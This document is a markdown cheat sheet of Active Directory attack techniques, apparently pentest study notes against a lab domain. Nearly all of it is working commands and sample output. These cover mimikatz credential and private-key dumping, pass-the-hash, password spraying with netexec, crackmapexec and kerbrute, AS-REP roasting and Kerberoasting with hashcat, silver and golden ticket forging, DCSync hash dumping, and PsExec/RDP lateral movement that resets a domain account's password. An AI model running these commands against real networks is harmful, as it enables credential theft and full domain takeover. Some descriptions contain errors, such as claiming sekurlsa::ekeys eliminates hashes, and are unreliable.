# AD Attacking

By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.

## NTLM Active Directory Authentication

Scenario (still working):

* The client is authenticating to a server using an IP address
* The client is authenticating to a server that belongs to a different Active Directory forest that has a legacy NTLM trust instead of a transitive inter-forest trust
* The client is authenticating to a server that doesn't belong to a domain
* No Active Directory domain exists (commonly referred to as "workgroup" or "peer-to-peer")
* Where a firewall would otherwise restrict the ports required by Kerberos (typically TCP 88)

## Kerberos Active Directory Authentication with NTLM pass-the-hash

Scenario:

* **Limitation**: Requires Windows NTLM has been stolen
* Use mimikatz module [sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
* Run sekurlsa::pth to insert NTLM into the windows memory
* Run sekurlsa::ekeys to elimiminate all NTLM hashes
* Connect via SMB to create Kerberos Ticket
* List Kerberos Tickets
* From [Duckwall-Abusing-Microsoft-Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)

```powershell
# Powercat Shell must run mimikatz one-liner
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

mimekatz# 
privilege::debug

# Use mimikatz sekurlsa::loggonpasswords to dump a list of logged-on users NTLM hashs
sekurlsa::logonpasswords

# Use mimikatz sekurlsa::pth to insert NTLM into the windows memory
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:8846F7EAEE8FB117AD06BDD830B7586D
sekurlsa::ekeys

# open SMB share the issue a ticket
dir \\web.example.com\share

# Show Keberos ticket with mimikatz
mimikatz#
sekurlsa::tickets

Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/26/2025 5:35:45 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/26/2025 7:32:22 AM ; 9/26/2025 3:35:45 PM ; 10/3/2025 5:35:45 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
```

## Extract AD Certificates and Private Keys

* Use mimikatz to patch disable key protection
* Run crypto::capi to patch [CryptoAPI](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi)
* Run crypto::cng to patch [KeyIso](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng)
* Run crypto::stores to list [systemstores](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#stores)
* Run crypto::certificates to extract [certificates](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#certificates)
* Run crypto::keys to extract [private keys](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#keys)
* User openssl to convert PVK (it an RSA key) into PEM Format

```powershell
mimikatz# 
privilege::debug

# Disable private key protection
crypto::capi
Local "CryptoAPI" patched
crypto::cng
"KeyIso" service patched

# List crypto stores
crypto::stores /systemstore:local_machine

# Extract certificates and private keys from local machine
crypto::certificates /systemstore:local_machine /store:my /export
crypto::keys /export

# Convert PVK into PEM
openssl rsa -inform pvk -in key.pvk -outform pem -out key.pem
```

## Attacks on Active Directory Authentication

## AD Password Spraying via LDAP

```shell
net accounts

Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
```

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://" + $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "mary", "Secr3t")

# Success
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com

# Wrong Password
format-default : The following exception occurred while retrieving member "distinguishedName": 
"The user name or password is incorrect.

```

## Automate AD Password Spraying via LDAP with Spray-Passwords.ps1

Features

* Query net accounts to avoid lockout
* Query net users to find all users
* Options
* -Pass Allows to provide a password
* -File Allows to provide a wordlist
* -Admin Tests for **Admin Credentials**

```powershell
cd tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass 'Secr3t' -Admin
```

## AD Password Spray with NXC (netexec)

* NetExec (a.k.a nxc) is the successor a network service exploitation tool crackmapexec
* From: [NetExec Wiki](https://www.netexec.wiki/getting-started/target-formats)
* Modules ftp,ssh,smb,nfs,winrm,mssql,wmi,vnc,ldap,rdp
* [+]  **User credendential**
* [+] (Pwn3d!) **Admin Credentials**

```bash
# Spray passwords or hash to validate credentials
nxc smb 192.168.207.70-75 -u 'mary'  -p 'Nexus123!' -d example.com --no-bruteforce --continue-on-success
nxc smb 192.168.113.70-76 -u 'dave' --hash 08d7a47a6f9f66b97b1bae4178747494  -d example.com --no-bruteforce --continue-on-success

SMB         192.168.207.70  3389   DC1              [+] corp.com\pete:Nexus123! 
SMB         192.168.207.72  3389   WEB02            [+] corp.com\pete:Nexus123! (Pwn3d!)
SMB         192.168.207.74  3389   CLIENT4          [+] corp.com\pete:Nexus123! 
```

```bash
# Enumerate SMB Shares
nxc smb 192.168.207.70-75 -u 'mary'  -p 'Nexus123!' -d example.com --shares
nxc smb 192.168.113.70-76 -u 'dave' --hash 08d7a47a6f9f66b97b1bae4178747494  -d example.com --shares

[*] Enumerated shares
SMB         192.168.113.72  445    WEB02            Share           Permissions     Remark
SMB         192.168.113.72  445    WEB02            -----           -----------     ------
SMB         192.168.113.72  445    WEB02            ADMIN$                          Remote Admin
SMB         192.168.113.72  445    WEB02            backup          READ,WRITE      
SMB         192.168.113.72  445    WEB02            C$                              Default share
SMB         192.168.113.72  445    WEB02            IPC$            READ            Remote IPC
```

## AD Password Spraying with CrackMap (Obsolete)

Scenario

* AD Credential have been leaked without user name
* Use `crackmapexec` for password spraying attack

```bash
# IP Range
crackmapexec smb 192.168.226.70-76 -u /tmp/users.txt -p 'Nexus123!' -d corp.com --continue-on-success

SMB         192.168.226.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.226.75  445    CLIENT75         [-] corp.com\dave:Secr3t! STATUS_LOGON_FAILURE 
SMB         192.168.226.75  445    CLIENT75         [+] corp.com\jeff:Secr3t! (Pwn3d!)
SMB         192.168.226.75  445    CLIENT75         [-] corp.com\mary:Secr3t! STATUS_LOGON_FAILURE 

```

## AD Password Spraying with Kerbrute (ASP-REP)

Feature

* Download [kerbrute](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
* Cross-platform for Linux and Windows and Mac
* bruteuser - Bruteforce a single user's password from a wordlist
* bruteforce - Read username:password combos from a file or stdin and test them
* userenum - Enumerate valid domain usernames via Kerberos
* passwordspray - Test a single password against a list of users

Windows

```powershell
cd tools
.\kerbrute_windows_amd64.exe userenum -d corp.com .\usernames.txt

2025/09/26 08:54:44 >   dc1.corp.com:88
2025/09/26 08:54:44 >  [+] VALID USERNAME:       jeff@corp.com
2025/09/26 08:54:44 >  [+] VALID USERNAME:       dave@corp.com

.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

2025/09/26 08:56:56 >   dc1.corp.com:88
2025/09/26 08:56:56 >  [+] VALID LOGIN:  jeff@corp.com:Nexus123!
```

Kali (cross platform)

```shell
cd tools
./kerbrute_linux_386 userenum -d corp.com .\usernames.txt
./kerbrute_linux_386 passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

The **wordlist usernames.txt MUST be ANSI encoded**. Otherwise you get a network error.

## AD Cracking Kerberos User Password with AS-REP Roasting (Crack-the-Hash for Users)

Scenario

* **Limitation**: AD Kerberos option Pre-Auth is DISABLED
* **Requires**: Valid domain user credentials like passwd
* Retrieve kerberos user password hash
* Crack the hash with HashCat
* From [Cracking Active Directory Passwords with AS-REP Roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)

Attack with Windows

```powershell
# No Pre-Auth users
Import-Module powerview.ps1
Get-DomainUser -PreauthNotRequired -Verbose

cn                    : mimi
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

# Disable Pre-Auth (4194304) if we have GenericAll or GenericWrite ACLs for an TargetUser
# A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
# SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
# Wildcards accepted!
Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304} -Verbose

# Verfiy the change
Get-DomainUser -Identity TargetUser | Select-Object samaccountname, useraccountcontrol
```

```powershell
# Get user password hash
.\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:C:\Temp\asreproast.hashes

[*] AS-REP hash:

      $krb5asrep$mimi@example.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB9725...1DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A

# IMPORTANT: Add the $23 before the domain user to make it compatible with hashcat
cat asreproast.hashes

      $krb5asrep$23$mimi@example.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A

```

Attack with Kali

```bash
# No Pre-Auth users
impacket-GetNPUsers -h
 usage: GetNPUsers.py [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname] target

# Get user password hash
impacket-GetNPUsers -dc-ip 192.168.1.100  -request -outputfile asreproast.hashes example.com/user
Password:

Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
mimi            2025-09-02 19:21:17.285464  2025-09-07 12:45:15.559299  0x410200

hashcat -hh | grep -E "(Kerberos|AS-REP)"
...
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol

# crack the AS-REP Hash
sudo hashcat -m 18200 asreproast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
```

## AD Cracking Kerberos Service Password with TGS-REP Kerberoasing (Crack-the-hash for SPNs)

Scenario:

* **Limitation**: If SPN run in the context of a computer account, a managed service account, or a group-managed service account, the **password will be randomly generated, complex, and 120 characters long**, making cracking infeasible. The same is true for the **krbtgt user account** which acts as service account for the KDC.
* **Requires**: Attacker knows domain user credentials
* **Requires**: Attacker knows service principle name (SPN) of a service to attack
* Attacker requests a ticket granting ticket (TGT) for the domain user
* Attacker requests a service ticket from a (TGS) for the service principal (SPNs)
* Attacker cracks the service principal hash using **RC4 algorithm** using hashcat
* From: [Kerberoasting](https://blog.harmj0y.net/redteaming/kerberoasting-revisited/)
* Tool: [Rubeus.exe](https://github.com/GhostPack/Rubeus/releases)

Attack with Windows

* option /tgtdeleg lowers hash encryption security to weak RC4
* this is way faster than AES crack

```powershell
# Get service password hash
.\Rubeus.exe kerberoast /tgtdeleg /nowrap /format:hashcat /outfile:kerberoast.hashes

 [*] Action: Kerberoasting
 
 [*] Using 'tgtdeleg' to request a TGT for the current user
 [*] RC4_HMAC will be the requested for AES-enabled accounts

 $krb5tgs$23$*iis_service$CORP.COM$HTTP/web04.corp.com:80*$7c10fd1e3bdf0ff41f001 ...

 # List service principle for user
 setspn.exe -L iis_services
```

Attack with Kali

```bash
# Get service password hash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.100 example.com/user

# crack the TGS-REP hash
hashcat -hh | grep -E "(Kerberos|TGS-REP)"
...
 13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol

sudo hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## AD Keberos Silver Ticket (Make your own service ticket)

The Kerberos Silver Ticket is a valid Ticket Granting Service (TGS) Kerberos ticket since it is encrypted/signed by the service account configured with a Service Principal Name for each server the Kerberos-authenticating service runs on. This means the Silver Ticket scope is limited to whatever **service is targeted on a specific server**. Good news since a **Silver Ticket is a forged TGS**, there is **no communication with a Domain Controller**. Most services don’t validate the PAC (by sending the PAC checksum to the Domain Controller for PAC validation), so a valid TGS generated with the service account password hash can include a PAC that is entirely fictitious – even **claiming the user is a Domain Admin** without challenge or correction.

Sitation:

* **Limitation**: Service applications MUST NOT be configured perform pirvileged authencation certificate PAC validation (default)
* **Requires**: Attacker has local Admin to use mimikatz
* **Requires**: Attacker knows service account SPNs password or its associated NTLM hash
* Use mimikatz to create silver ticket: a **custom service ticket to access the target resource** with any permission want
  * Service Target SPN password hash
  * Domain SID
  * Target SPN
* From: [How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011)

We need to provide the **domain SID** (/sid:), domain name (/domain:), and the **target where the SPN** runs (/target:). We also need to include the **SPN protocol** (/service:), **NTLM hash of the Tartget service SPN** (/rc4:), and the /ptt option, which allows us to **inject the forged ticket into the memory** of the machine we execute the command on. Finally, we must enter **any existing domain user** for /user:. This user will be set in the forged ticket.

```powershell
# Get SPN password hash
privilege::debug
sekurlsa::logonpasswords

Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 10/3/2025 5:36:24 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09

# Get Domain SID
whoami /user

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-xxxx

# Get Target SPN
setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web01.corp.com
        HTTP/web01
        HTTP/web01.corp.com:80
```

```powershell
# Use mimikatz to create SILVER ticket for a Target SPN
# CIFS/share.corp.com
# HTTP/web01.corp.com
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:share.corp.com /service:cifs /rc4:4d28cf5252d39971419580a51484ca09 /admin:jeff /id:1106 
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web01.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

User      : jeff
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web01.corp.com
Lifetime  : 9/14/2025 4:37:32 AM ; 9/11/2035 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

...
Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```

```powershell
# List the silver ticket
klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web01.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2025 4:37:32 (local)
        End Time:   9/11/2035 4:37:32 (local)
        Renew Time: 9/11/2035 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

# User the silver ticket to access the service
Invoke-WebRequest -UseDefaultCredentials http://web01
```

## AD Sync Update Attack to dump NTLM hash of domain users

Situation

* **Limitation:** Attacker has access to members of Domain Admins, Enterprise Admins, and Administrators groups
* **Requires:** Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set permission
* Run mimikatz `lsadump::dcsync` to dump NTML of any domain user from within the domain (Windows)
* Run `impacket-secretsdump` to dump NTML hash of any user domain from outside of the domain (Linux)

```powershell
mimikatz#
privilege::debug
token::elevate
...
lsadump::dcsync /user:corp.com\Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1199
Object Relative ID   : 1199

Credentials:
    Hash NTLM: 08d7a47c6f9f66b98b1bae4178747494
```

```bash
impacket-secretsdump -just-dc-user Administrator example.com/user:"password\!"@192.168.1.1

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47c6f9f66b98b1bae4178747494:::
```

Crack the hash or alternatively pass-the-hash

```bash
hashcat -m 1000 dcsync.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## AD Kerberos Golden Ticket

Scenario

* **Requires**: 
* Use **mimikatz** to create a kerberos golden ticket
* from: [Golden Ticket](https://netwrix.com/en/resources/blog/complete-domain-compromise-with-golden-tickets//)

Attacker

```shell
impacket-secretsdump -just-dc-user krbtgt example.com/user:"password\!"@192.168.1.1
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
```

AD Victim

```powershell
mimikatz # 
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:example.com /ptt /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /user:Administrator /ticket:Administrator.kirbi

User      : Administrator
Domain    : example.com (EXAMPLE)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 10/24/2025 6:32:08 AM ; 10/22/2035 6:32:08 AM ; 10/22/2035 6:32:08 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ example.com' successfully submitted for current session

mimikatz # kerberos::tgt
Kerberos TGT of current session :
           Start/End/MaxRenew: 10/24/2025 6:35:48 AM ; 10/22/2035 6:35:48 AM ; 10/22/2035 6:35:48 AM
           Service Name (02) : krbtgt ; example.com ; @ example.com

mimikatz # exit
Bye!

# DC Connect via SMB
PS C:\tools> net use i: \\dc.example.com\c$
PS C:\tools> copy .\mimikatz.exe \\dc.example.com\c$

# DC Connect via PSExec
PS C:\tools> .\PSExec.exe \\dc.example.com cmd
net user domainadmin "newPassword1" /domain
net localgroup "Remote Desktop Users" CORP\domainadmin /add

# DC Connect via RDP
xfreerdp3 +clipboard /cert:ignore /d:corp.com /u:jeffadmin /v:192.168.140.70 /p:'newPassword1'

# AD Connect to any domain computer using restrict admin mode
PS C:\tools> .\PSExec.exe \\web01.example.com powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# AD Connect without password using the DC credentials (if allowed?)
mstsc.exe /restrictedadmin
else
mstsc.exe


```
